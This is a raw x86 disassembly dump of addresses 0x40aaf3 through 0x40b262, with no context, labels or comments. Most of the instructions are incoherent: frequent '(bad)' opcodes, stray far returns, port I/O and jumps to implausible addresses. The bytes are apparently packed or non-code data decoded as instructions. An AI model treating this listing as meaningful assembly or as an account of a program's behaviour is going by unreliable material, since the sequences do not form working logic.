  40aaf3:	add    DWORD PTR [ebp+0x60],0x31
  40aaf7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40aafe:	inc    ebp
  40aaff:	dec    DWORD PTR [ebx-0x341ff701]
  40ab05:	test   esi,ecx
  40ab07:	dec    DWORD PTR [ebx-0x7f8a3301]
  40ab0d:	push   eax
  40ab0e:	add    DWORD PTR [ebp+0x0],eax
  40ab11:	dec    ebx
  40ab13:	or     al,0xce
  40ab15:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40ab1c:	into   
  40ab1d:	add    BYTE PTR [ebx-0x34ff1400],cl
  40ab23:	mov    esi,ecx
  40ab25:	sar    bh,0x45
  40ab28:	adc    al,0x8b
  40ab2a:	clc    
  40ab2b:	fadd   DWORD PTR [ebp+0x0]
  40ab2e:	mov    ebp,DWORD PTR [edx+0x8]
  40ab31:	push   edi
  40ab32:	adc    BYTE PTR [eax+0x1],0x83
  40ab36:	add    al,al
  40ab38:	retf   
  40ab39:	mov    ecx,esi
  40ab3b:	cld    
  40ab3c:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40ab42:	into   
  40ab43:	add    BYTE PTR [ebx+0x756aec00],cl
  40ab49:	jne    0x40ab7e
  40ab4b:	inc    DWORD PTR [ebx]
  40ab4d:	rcl    BYTE PTR [ecx+0x50],1
  40ab50:	push   eax
  40ab51:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40ab57:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40ab5e:	sar    bh,0x84
  40ab61:	or     BYTE PTR [ebx],al
  40ab63:	push   eax
  40ab64:	add    BYTE PTR [ebx+0x4532c845],cl
  40ab6a:	pushf  
  40ab6b:	xor    eax,0x89b49cc7
  40ab70:	test   eax,ebp
  40ab72:	clc    
  40ab73:	inc    ebp
  40ab74:	inc    ebp
  40ab75:	mov    DWORD PTR [eax+eax*8],esi
  40ab78:	sub    al,0x34
  40ab7a:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  40ab81:	dec    ebp
  40ab82:	bound  esi,QWORD PTR [ebx]
  40ab84:	inc    edi
  40ab85:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  40ab8b:	dec    ebp
  40ab8c:	bound  esi,QWORD PTR [ebx]
  40ab8e:	inc    edi
  40ab8f:	add    eax,DWORD PTR [ebx-0xf7a377]
  40ab95:	inc    ebp
  40ab96:	add    ch,dl
  40ab98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab99:	pushf  
  40ab9a:	inc    edi
  40ab9c:	dec    esp
  40ab9e:	lea    eax,[ebp+0x45fff860]
  40aba4:	push   eax
  40aba5:	xor    dh,BYTE PTR [ebp-0x64]
  40aba8:	(bad)  
  40aba9:	(bad)  
  40abaa:	pop    esp
  40abab:	lods   al,BYTE PTR ds:[esi]
  40abac:	inc    DWORD PTR [ebp+0x4508f8ff]
  40abb2:	mov    esi,DWORD PTR [eax]
  40abb4:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40abbb:	test   DWORD PTR [edi-0x8],edx
  40abbe:	inc    esi
  40abbf:	inc    ebp
  40abc0:	add    BYTE PTR [esi],bh
  40abc2:	push   0x8b809c
  40abc7:	in     al,dx
  40abc8:	inc    ebp
  40abc9:	push   ebp
  40abca:	mov    esi,DWORD PTR [ebx]
  40abcc:	cld    
  40abcd:	add    eax,DWORD PTR [eax+0xf013b]
  40abd3:	adc    al,0x0
  40abd5:	add    bh,bh
  40abd7:	jmp    0xbdacf4
  40abdc:	add    BYTE PTR [ebp+0x45],cl
  40abdf:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40abe5:	dec    ebp
  40abe6:	push   0x38033
  40abeb:	cmp    eax,DWORD PTR [eax]
  40abed:	unpcklps xmm7,xmm0
  40abf0:	jne    0x40abf2
  40abf2:	dec    DWORD PTR [ebx+0x5545cc18]
  40abf8:	mov    DWORD PTR [ebx],esi
  40abfa:	shl    BYTE PTR [ebx],1
  40abfc:	inc    ebp
  40abfd:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40ac03:	retf   0x5575
  40ac06:	dec    DWORD PTR [ebx-0x5ba17e8]
  40ac0c:	(bad)  
  40ac0d:	stc    
  40ac0e:	in     al,dx
  40ac0f:	or     al,0x85
  40ac11:	dec    ebp
  40ac12:	clc    
  40ac13:	xor    eax,DWORD PTR [ebp+0x3]
  40ac16:	mov    ebp,ecx
  40ac18:	rol    BYTE PTR [eax],1
  40ac1a:	inc    ebp
  40ac1b:	add    BYTE PTR [eax-0x7747ab3],bh
  40ac21:	clc    
  40ac22:	inc    ebp
  40ac23:	retf   
  40ac24:	mov    edx,ebx
  40ac26:	in     al,dx
  40ac27:	(bad)  
  40ac28:	retf   
  40ac29:	into   
  40ac2a:	into   
  40ac2b:	scas   eax,DWORD PTR es:[edi]
  40ac2c:	dec    ebp
  40ac2d:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40ac33:	sub    ecx,esi
  40ac35:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ac38:	(bad)  
  40ac39:	mov    edi,eax
  40ac3b:	int3   
  40ac3c:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ac42:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ac49:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ac4f:	rdtsc  
  40ac51:	retf   0x559c
  40ac54:	(bad)  
  40ac55:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ac5c:	inc    ebp
  40ac5d:	add    eax,0xeb9c4d3f
  40ac62:	(bad)  
  40ac63:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ac69:	xor    ecx,DWORD PTR [ebp+0x33]
  40ac6c:	mov    eax,DWORD PTR [ebx]
  40ac6e:	call   0xce507776
  40ac73:	retf   0x55d1
  40ac76:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ac7c:	jmp    0x40ac77
  40ac7e:	add    BYTE PTR ds:0xebf44d8b,al
  40ac84:	push   ebp
  40ac85:	mov    ebp,DWORD PTR [ebx]
  40ac87:	mov    eax,0x33f8558b
  40ac8c:	retf   
  40ac8d:	xor    ecx,esi
  40ac8f:	add    edx,ecx
  40ac91:	add    eax,DWORD PTR [edx+0xca010f]
  40ac97:	push   ebp
  40ac98:	dec    ebp
  40ac99:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ac9f:	stc    
  40aca0:	rol    DWORD PTR ds:0xebce4dd6,cl
  40aca6:	scas   eax,DWORD PTR es:[edi]
  40aca7:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40acad:	xor    ebp,DWORD PTR [ebx]
  40acaf:	xor    edi,DWORD PTR [ebx]
  40acb1:	add    esi,DWORD PTR [edi+0x3]
  40acb4:	mov    ecx,DWORD PTR [edi]
  40acb6:	clc    
  40acb7:	retf   0x55cb
  40acba:	into   
  40acbb:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40acc2:	test   al,0x4d
  40acc4:	push   ebp
  40acc5:	jbe    0x40acfa
  40acc7:	mov    esi,DWORD PTR [ebx]
  40acc9:	mov    al,0x3
  40accb:	push   ebp
  40accc:	add    esi,DWORD PTR [ebx]
  40acce:	rdpmc  
  40acd0:	retf   0x5503
  40acd3:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40acd9:	dec    ebp
  40acda:	stc    
  40acdb:	mov    ecx,DWORD PTR [eax]
  40acdd:	or     BYTE PTR [ebp+0x4d],cl
  40ace0:	jmp    0x134ad70
  40ace5:	dec    ebp
  40ace6:	dec    ebp
  40ace7:	(bad)  
  40ace8:	mov    ebx,esp
  40acea:	clc    
  40aceb:	test   ebx,ecx
  40aced:	clc    
  40acee:	ror    DWORD PTR [ebp-0x2a],cl
  40acf1:	mov    esi,ecx
  40acf3:	lock scas eax,DWORD PTR es:[edi]
  40acf5:	inc    ebp
  40acf6:	mov    esi,DWORD PTR [ebx]
  40acf8:	hlt    
  40acf9:	pushf  
  40acfa:	jge    0x40ac87
  40acfc:	sub    ebx,esp
  40acfe:	cmp    ecx,ebx
  40ad00:	ja     0x40acd0
  40ad02:	mov    ebp,DWORD PTR [eax-0x58]
  40ad05:	dec    ebp
  40ad06:	xor    ecx,DWORD PTR [di+0x3]
  40ad0a:	mov    esp,esp
  40ad0c:	clc    
  40ad0d:	push   ebp
  40ad0e:	retf   
  40ad0f:	mov    dl,bl
  40ad11:	adc    esi,edx
  40ad13:	jb     0x40ace3
  40ad15:	add    BYTE PTR [edi-0xb7474b3],ch
  40ad1b:	lock jge 0x40ace9
  40ad1e:	sub    ecx,DWORD PTR [ebp+0x3b]
  40ad21:	mov    esi,DWORD PTR [edi-0x20]
  40ad24:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
  40ad2b:	mov    BYTE PTR [ebx-0x34b20729],cl
  40ad31:	mov    edx,ebx
  40ad33:	lock (bad) 
  40ad35:	ror    esi,cl
  40ad37:	push   ebp
  40ad38:	scas   eax,DWORD PTR es:[edi]
  40ad39:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40ad3f:	sahf   
  40ad40:	sub    esi,DWORD PTR [edx]
  40ad42:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40ad48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad49:	xor    esp,DWORD PTR [ebx]
  40ad4b:	add    ecx,DWORD PTR [ebp-0x1c]
  40ad4e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad51:	mov    bl,cl
  40ad53:	cmp    dl,bl
  40ad55:	jb     0x40ad25
  40ad57:	add    dh,dl
  40ad59:	dec    ebp
  40ad5a:	scas   eax,DWORD PTR es:[edi]
  40ad5b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ad61:	shr    DWORD PTR [ebx],cl
  40ad63:	into   
  40ad64:	cmp    edx,esi
  40ad66:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ad6c:	dec    ebp
  40ad6d:	dec    ebp
  40ad6e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ad74:	retf   
  40ad75:	xor    edx,esi
  40ad77:	add    ecx,esi
  40ad79:	imul   ecx,edx
  40ad7c:	mov    DWORD PTR [ebp+0x8],edx
  40ad7f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ad82:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ad88:	add    esi,DWORD PTR [ebx]
  40ad8a:	rol    BYTE PTR [ebx],0x45
  40ad8d:	sysexit 
  40ad8f:	xlat   BYTE PTR ds:[ebx]
  40ad90:	pushf  
  40ad91:	jge    0x40ad1c
  40ad93:	xor    esp,eax
  40ad95:	sub    eax,DWORD PTR [ebp-0x73]
  40ad98:	(bad)  
  40ad99:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ada0:	dec    ebp
  40ada1:	xchg   BYTE PTR [ebx],dh
  40ada3:	inc    DWORD PTR [ebx]
  40ada5:	(bad)  
  40ada6:	jmp    0x40adf5
  40ada8:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40adae:	dec    ebp
  40adaf:	into   
  40adb0:	mov    ebp,DWORD PTR [edi-0x23737420]
  40adb6:	sahf   
  40adb7:	shl    DWORD PTR [edx],cl
  40adb9:	retf   0x5588
  40adbc:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40adc2:	add    eax,DWORD PTR [eax]
  40adc4:	in     al,0x4d
  40adc6:	push   ebp
  40adc7:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40adcd:	bound  eax,QWORD PTR [eax]
  40adcf:	int    0x4d
  40add1:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40add7:	dec    ebp
  40add8:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40adde:	jge    0x40adae
  40ade0:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ade6:	add    cl,dh
  40ade8:	dec    ebp
  40ade9:	dec    DWORD PTR [ebx-0x2c032301]
  40adef:	inc    ebp
  40adf0:	push   ebp
  40adf1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40adf7:	lea    ebx,[esi-0x7400cdac]
  40adfd:	push   eax
  40adfe:	mov    ah,0x45
  40ae00:	push   ebp
  40ae01:	mov    esi,DWORD PTR [ebx]
  40ae03:	les    esi,FWORD PTR [ebx]
  40ae05:	add    BYTE PTR [ebx],al
  40ae07:	inc    DWORD PTR [ebx]
  40ae09:	mov    ecx,DWORD PTR [edi]
  40ae0b:	cld    
  40ae0c:	retf   0x4d80
  40ae0f:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ae15:	jne    0x40ada2
  40ae17:	(bad)  
  40ae18:	in     al,dx
  40ae19:	ror    bl,1
  40ae1b:	pop    edi
  40ae1c:	into   
  40ae1d:	add    BYTE PTR [edi-0xf2f7475],ch
  40ae23:	not    bl
  40ae25:	adc    al,0xca
  40ae27:	inc    ebp
  40ae28:	push   ebp
  40ae29:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ae2f:	push   0xaf80d6
  40ae34:	mov    eax,DWORD PTR [eax]
  40ae36:	fdiv   st(7),st
  40ae38:	sti    
  40ae39:	sbb    dh,cl
  40ae3b:	pop    esi
  40ae3c:	xchg   esp,eax
  40ae3d:	leave  
  40ae3e:	sahf   
  40ae3f:	add    al,0x32
  40ae41:	push   ebp
  40ae42:	cmp    ebp,esp
  40ae44:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ae48:	dec    DWORD PTR [ecx-0x740f0375]
  40ae4e:	push   ebp
  40ae4f:	cld    
  40ae50:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ae56:	retf   0x558b
  40ae59:	clc    
  40ae5a:	xor    esi,eax
  40ae5c:	add    esi,DWORD PTR [ebp-0x75]
  40ae5f:	(bad)  
  40ae60:	hlt    
  40ae61:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  40ae68:	mov    DWORD PTR [edx],ecx
  40ae6a:	hlt    
  40ae6b:	(bad)  
  40ae6c:	dec    ebp
  40ae6d:	add    dh,BYTE PTR [ebx]
  40ae6f:	leave  
  40ae70:	mov    edx,0xffec8d55
  40ae75:	push   ecx
  40ae76:	rol    DWORD PTR [ebp+0x55],1
  40ae79:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ae7f:	mov    eax,0xf8030b33
  40ae84:	lar    ecx,di
  40ae87:	push   ebp
  40ae88:	retf   0x863b
  40ae8b:	jne    0x40ae8a
  40ae8d:	mov    edi,edi
  40ae8f:	or     BYTE PTR [ebp+0x41],dh
  40ae92:	mov    esp,eax
  40ae94:	cld    
  40ae95:	inc    eax
  40ae96:	mov    al,0x29
  40ae98:	add    DWORD PTR [ecx+0x0],eax
  40ae9b:	loope  0x40ae22
  40ae9d:	inc    ecx
  40ae9e:	call   eax
  40aea0:	inc    edx
  40aea2:	mov    eax,DWORD PTR [eax]
  40aea4:	cld    
  40aea5:	mov    eax,DWORD PTR [eax+0x8d0151]
  40aeab:	clc    
  40aeac:	xor    BYTE PTR [ebp+0x45],al
  40aeaf:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40aeb5:	loopne 0x40aeb6
  40aeb7:	mov    edi,edi
  40aeb9:	mov    ecx,eax
  40aebb:	clc    
  40aebc:	jne    0x40ae8e
  40aebe:	call   0x81c1c7
  40aec3:	sub    DWORD PTR [ebp+0x45],esi
  40aec6:	test   esi,eax
  40aec8:	je     0x40aecb
  40aeca:	mov    eax,esi
  40aecc:	cld    
  40aecd:	or     DWORD PTR [eax+0x401c9],eax
  40aed3:	push   ebp
  40aed4:	add    ah,ch
  40aed6:	add    BYTE PTR [ecx+0x6a],dl
  40aed9:	inc    ebp
  40aeda:	push   esi
  40aedb:	mov    DWORD PTR [eax-0x4],edx
  40aede:	pop    edi
  40aedf:	mov    ebx,DWORD PTR [ebx-0x4]
  40aee2:	ret    0xbe
  40aee5:	push   es
  40aee6:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40aeec:	clc    
  40aeed:	lock inc ebp
  40aeef:	jne    0x40af47
  40aef1:	(bad)  
  40aef2:	jne    0x40aef8
  40aef4:	mov    eax,0xf841ba66
  40aef9:	rol    BYTE PTR [esi],1
  40aefb:	(bad)  
  40aefc:	jne    0x40af2f
  40aefe:	cmp    eax,ebx
  40af00:	pop    esi
  40af01:	mov    ecx,DWORD PTR [eax]
  40af03:	push   ecx
  40af04:	inc    ecx
  40af05:	lea    edi,[eax+edi*8+0x42]
  40af09:	inc    ebp
  40af0a:	ror    DWORD PTR [ebx-0x408303be],0x41
  40af11:	xchg   edx,ebp
  40af13:	mov    ebx,eax
  40af15:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40af1b:	or     edi,eax
  40af1d:	inc    ebp
  40af1e:	inc    ebp
  40af1f:	(bad)  
  40af20:	mov    ecx,DWORD PTR [eax]
  40af22:	cld    
  40af23:	(bad)  
  40af24:	jmp    0x40af27
  40af26:	mov    eax,esi
  40af28:	mov    DWORD PTR ds:0x4f8c98b,eax
  40af2e:	rcl    BYTE PTR [esi+0xf],1
  40af31:	iret   
  40af32:	inc    ebp
  40af33:	leave  
  40af34:	(bad)  
  40af35:	dec    DWORD PTR [ecx]
  40af37:	mov    eax,esi
  40af39:	mov    eax,DWORD PTR [edi]
  40af3b:	mov    dh,0xd1
  40af3e:	push   es
  40af3f:	nop
  40af40:	(bad)  
  40af41:	inc    DWORD PTR [ebx]
  40af43:	push   esi
  40af44:	leave  
  40af45:	iret   
  40af46:	add    al,0x46
  40af48:	push   ebp
  40af49:	in     eax,0xec
  40af4b:	push   ebp
  40af4c:	push   ecx
  40af4d:	inc    DWORD PTR [ebp+0x56]
  40af50:	mov    DWORD PTR [esi-0x4],eax
  40af53:	loope  0x40afaa
  40af55:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40af5b:	add    al,BYTE PTR [edx]
  40af5d:	mov    edx,DWORD PTR [ebp-0x17]
  40af60:	cmp    edi,esi
  40af62:	jne    0x40af63
  40af64:	(bad)  
  40af65:	push   esi
  40af66:	pop    es
  40af67:	push   ebp
  40af68:	mov    ebp,esp
  40af6a:	or     BYTE PTR [ebp+0x41],al
  40af6d:	add    edi,edx
  40af6f:	sub    BYTE PTR [eax-0x4],al
  40af72:	shl    BYTE PTR [ebp-0x3e],0x1
  40af76:	add    BYTE PTR [ebx+ecx*4],bl
  40af79:	mov    edx,DWORD PTR [ecx+0x14]
  40af7c:	lea    edx,[edx-0x1ba7508]
  40af82:	push   esi
  40af83:	enter  0xd375,0xb8
  40af87:	test   DWORD PTR [esi],0x6ce0750
  40af8d:	enter  0xd375,0x3b
  40af91:	neg    DWORD PTR [esi+0x50]
  40af94:	or     cl,dl
  40af96:	inc    edx
  40af97:	(bad)  
  40af98:	in     eax,dx
  40af99:	in     al,dx
  40af9a:	(bad)  
  40af9b:	sub    eax,DWORD PTR [ebx]
  40af9d:	inc    eax
  40af9e:	in     eax,dx
  40af9f:	push   eax
  40afa0:	add    dl,BYTE PTR [eax-0x37]
  40afa3:	push   edi
  40afa4:	push   ebp
  40afa5:	imul   ah
  40afa7:	adc    DWORD PTR [ecx-0x1],0x45
  40afab:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40afb1:	lea    edi,[eax-0x7fff4ca]
  40afb7:	mov    eax,0x4550402
  40afbc:	cmp    ebp,ecx
  40afbe:	jne    0x40af6b
  40afc0:	mov    eax,DWORD PTR ds:0x241e808
  40afc6:	loope  0x40afc8
  40afc8:	inc    eax
  40afc9:	stc    
  40afca:	xlat   BYTE PTR ds:[ebx]
  40afcb:	ss inc ecx
  40afcd:	aas    
  40afce:	in     eax,0x7d
  40afd0:	ret    0x8b
  40afd3:	lock mov edi,DWORD PTR [ebp-0x18]
  40afd7:	and    edi,edi
  40afd9:	mov    edi,edi
  40afdb:	call   0xe40eb0b7
  40afe0:	push   es
  40afe1:	add    al,ch
  40afe3:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40afea:	(bad)  
  40afeb:	hlt    
  40afec:	add    eax,0xffd3e87d
  40aff1:	cmp    bh,0x8
  40aff4:	(bad)  
  40aff5:	fld    DWORD PTR [esi]
  40aff7:	out    dx,al
  40aff8:	call   0xff9faf00
  40affd:	cmp    al,0x46
  40afff:	shr    edx,0x8
  40b002:	(bad)  
  40b003:	pop    es
  40b004:	fisttp QWORD PTR [ebp+0xe577eff]
  40b00a:	push   ebx
  40b00b:	add    BYTE PTR [ebx+0x24008b56],cl
  40b011:	add    BYTE PTR [ebp+0x50],al
  40b014:	push   eax
  40b015:	add    DWORD PTR [ebx+0x757d1834],ecx
  40b01b:	sub    edx,DWORD PTR [esi-0x24]
  40b01e:	jne    0x40afd6
  40b020:	lods   eax,DWORD PTR ds:[esi]
  40b021:	mov    edx,DWORD PTR [edx-0x34]
  40b024:	dec    esi
  40b025:	out    0x83,eax
  40b027:	into   
  40b028:	push   edi
  40b02a:	loopne 0x40affa
  40b02c:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40b030:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40b037:	rol    DWORD PTR [edx],0x8
  40b03a:	mov    esp,ecx
  40b03c:	cmp    DWORD PTR [ebx],0xc
  40b03f:	mov    esi,0x5001c0
  40b044:	push   eax
  40b045:	push   cs
  40b046:	push   eax
  40b047:	(bad)  
  40b048:	sub    edx,edi
  40b04a:	push   esi
  40b04b:	adc    al,0xcb
  40b04d:	ins    DWORD PTR es:[edi],dx
  40b04e:	mov    eax,0x203e8
  40b053:	add    al,ah
  40b055:	inc    esi
  40b056:	mov    al,ch
  40b058:	pop    es
  40b059:	add    DWORD PTR [eax],0x1
  40b05c:	add    dh,al
  40b05e:	add    ah,ch
  40b060:	rol    DWORD PTR [edx-0xd],1
  40b063:	cli    
  40b064:	push   0x4a
  40b066:	pop    ecx
  40b067:	retf   0xfe6
  40b06a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40b070:	(bad)  
  40b071:	dec    BYTE PTR [ebx+0x45b1fc72]
  40b077:	(bad)  
  40b078:	sub    ebp,DWORD PTR [ebx]
  40b07a:	and    al,0x52
  40b07c:	(bad)  
  40b07d:	dec    edi
  40b07e:	inc    ebp
  40b07f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40b086:	add    BYTE PTR [ebp-0x7b],dh
  40b089:	pop    eax
  40b08a:	add    BYTE PTR [edx+0x0],bl
  40b08d:	pop    edx
  40b08e:	dec    ebp
  40b08f:	jmp    DWORD PTR [ebx]
  40b091:	and    al,0xec
  40b093:	push   edx
  40b094:	out    0x64,eax
  40b096:	jmp    0xd3f2a69b
  40b09b:	jmp    0x40b0f5
  40b09d:	mov    al,0xfe
  40b09f:	dec    BYTE PTR [ebp-0x18fd8018]
  40b0a5:	add    BYTE PTR [esi+ebp*1],bh
  40b0a8:	pop    edx
  40b0a9:	icebp  
  40b0aa:	mov    eax,cs
  40b0ac:	ins    BYTE PTR es:[edi],dx
  40b0ad:	adc    eax,0x75510000
  40b0b2:	mov    esi,0x70158
  40b0b7:	or     DWORD PTR [eax-0x74f48dfe],esi
  40b0bd:	mov    edi,esp
  40b0bf:	cld    
  40b0c0:	jge    0x40b137
  40b0c2:	(bad)  
  40b0c4:	aas    
  40b0c5:	and    al,0x6d
  40b0c7:	adc    cl,0x1
  40b0ca:	mov    eax,DWORD PTR [eax]
  40b0cc:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40b0d2:	dec    ebp
  40b0d3:	add    eax,ebp
  40b0d5:	add    BYTE PTR [edx],al
  40b0d7:	fadd   DWORD PTR [eax]
  40b0d9:	stc    
  40b0da:	enter  0xee00,0x8b
  40b0de:	sbb    eax,0x1
  40b0e1:	sbb    esi,ecx
  40b0e3:	in     al,0x0
  40b0e5:	in     eax,dx
  40b0e6:	add    BYTE PTR [eax],al
  40b0e8:	jne    0x40b075
  40b0ea:	cmp    edx,esp
  40b0ec:	jb     0x40b0f7
  40b0ee:	jmp    0x40b165
  40b0f0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40b0f6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40b0fc:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40b102:	jb     0x40b08d
  40b104:	pop    edx
  40b105:	fadd   QWORD PTR [ebx-0x7445faa1]
  40b10b:	or     dh,BYTE PTR [edx+0x0]
  40b10e:	inc    edx
  40b10f:	or     dl,bh
  40b111:	xlat   BYTE PTR ds:[ebx]
  40b112:	dec    edx
  40b113:	push   edi
  40b114:	add    al,0x7
  40b116:	leave  
  40b117:	rol    DWORD PTR [edx+eax*1],0x7
  40b11b:	add    ecx,ecx
  40b11d:	mov    edx,ecx
  40b11f:	int3   
  40b120:	jmp    0x40b0e0
  40b122:	mov    al,0x0
  40b124:	(bad)  
  40b125:	jne    0x40b10f
  40b127:	mov    eax,DWORD PTR [edx]
  40b129:	call   0xc1552e2e
  40b12e:	pop    edi
  40b12f:	add    ebx,DWORD PTR [ecx-0x37]
  40b132:	pop    ecx
  40b133:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40b13a:	push   es
  40b13b:	mov    eax,DWORD PTR [eax]
  40b13d:	int3   
  40b13e:	add    ch,al
  40b140:	jae    0x40b12a
  40b142:	int    0x1
  40b144:	enter  0x3000,0x18
  40b148:	add    BYTE PTR [ebp+0x75],al
  40b14b:	mov    esi,DWORD PTR [eax-0x171f0134]
  40b151:	push   0x2
  40b153:	pop    ecx
  40b154:	add    BYTE PTR [eax],cl
  40b156:	push   ebx
  40b157:	lea    edi,[edi+eax*2]
  40b15a:	mov    al,0x1
  40b15c:	jb     0x40b15e
  40b15e:	mov    al,0x10
  40b160:	push   eax
  40b161:	add    al,0x75
  40b163:	add    BYTE PTR [ebx],ch
  40b165:	add    ebx,esp
  40b167:	int3   
  40b168:	jne    0x40b17a
  40b16a:	movsx  edx,cl
  40b16d:	add    DWORD PTR [eax],eax
  40b16f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40b176:	mov    gs,edi
  40b178:	add    BYTE PTR [eax-0x50],ch
  40b17b:	add    al,ch
  40b17d:	mov    eax,DWORD PTR [ecx]
  40b17f:	sub    eax,DWORD PTR [eax]
  40b181:	jb     0x40b1f8
  40b183:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40b187:	jge    0x40b171
  40b189:	add    al,0x1
  40b18b:	add    DWORD PTR [eax],0x0
  40b18e:	jne    0x40b190
  40b190:	je     0x40b1d7
  40b192:	mov    eax,DWORD PTR [edi]
  40b194:	ror    BYTE PTR [ebp+0x4d],1
  40b197:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40b19e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40b1a4:	mov    DWORD PTR [ebx],ebp
  40b1a6:	fadd   DWORD PTR [eax+0x75]
  40b1a9:	inc    eax
  40b1aa:	pop    eax
  40b1ab:	lea    ebx,[ecx+0x4f]
  40b1ae:	push   0xb1000003
  40b1b3:	out    dx,eax
  40b1b4:	add    ebp,DWORD PTR [edx+edx*2]
  40b1b7:	add    BYTE PTR [ebx+ecx*4],bh
  40b1ba:	mov    ch,BYTE PTR [ebx]
  40b1bc:	jb     0x40b230
  40b1be:	add    al,0x89
  40b1c0:	push   eax
  40b1c1:	call   0x8428ff33
  40b1c6:	add    DWORD PTR [eax+eax*1],eax
  40b1c9:	jae    0x40b1df
  40b1cb:	icebp  
  40b1cc:	inc    ebp
  40b1cd:	mov    eax,DWORD PTR gs:[ecx]
  40b1d0:	int3   
  40b1d1:	out    dx,al
  40b1d2:	loopne 0x40b221
  40b1d4:	sub    eax,DWORD PTR [edx]
  40b1d6:	push   0xffffff83
  40b1d8:	pop    esi
  40b1d9:	push   cs
  40b1da:	jl     0x40b1f5
  40b1dc:	add    al,0xaf
  40b1de:	xor    eax,0x832b6d00
  40b1e3:	mov    eax,DWORD PTR [edx]
  40b1e5:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40b1eb:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40b1f1:	inc    ebp
  40b1f2:	shr    ebx,0x3
  40b1f5:	or     DWORD PTR [eax],0x4
  40b1f8:	push   0xffffffa5
  40b1fa:	pop    esi
  40b1fb:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40b202:	jmp    0x40b261
  40b204:	mov    edi,0xff0272
  40b209:	fdivr  QWORD PTR [ebp+0x5d]
  40b20c:	push   0x4e
  40b20e:	pop    ecx
  40b20f:	call   0x40f614
  40b214:	mov    DWORD PTR [ebx],eax
  40b216:	in     al,0xc8
  40b218:	rol    BYTE PTR [ebp-0x75],0xc1
  40b21c:	call   0xaab3fd
  40b221:	pop    esi
  40b222:	enter  0xceff,0x8b
  40b226:	repz mov ecx,DWORD PTR [ebp-0x34]
  40b22a:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40b231:	je     0x40b233
  40b233:	or     DWORD PTR [ebx-0x74183b24],eax
  40b239:	jne    0x40b21f
  40b23b:	jmp    0x40b236
  40b23d:	push   DWORD PTR [edx-0x24]
  40b240:	push   0x4d
  40b242:	pop    ecx
  40b243:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40b247:	jge    0x40b24f
  40b249:	mov    eax,eax
  40b24b:	sub    ebp,DWORD PTR [edx+0x24]
  40b24e:	pop    esi
  40b24f:	inc    ebp
  40b250:	mov    esp,0x8b6077
  40b255:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40b25b:	lods   al,BYTE PTR ds:[esi]
  40b25c:	add    BYTE PTR [ebx],bh
  40b25e:	enter  0xce73,0x49
  40b262:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
